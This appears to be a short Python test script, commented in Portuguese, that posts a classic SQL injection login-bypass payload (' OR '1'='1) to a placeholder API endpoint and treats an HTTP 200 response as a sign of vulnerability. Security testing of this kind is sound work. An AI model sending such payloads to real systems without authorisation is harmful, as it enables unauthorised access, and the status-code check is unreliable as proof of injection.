import requests

# URL da API para teste
url = "https://api.exemplo.com/v1/user"

# Teste de injeção SQL na entrada do usuário
payload = {"username": "' OR '1'='1", "password": "senha"}

response = requests.post(url, json=payload)

# Verifica o status da resposta
if response.status_code == 200:
    print("Possível vulnerabilidade de injeção SQL encontrada!")
else:
    print("Nenhuma vulnerabilidade detectada.")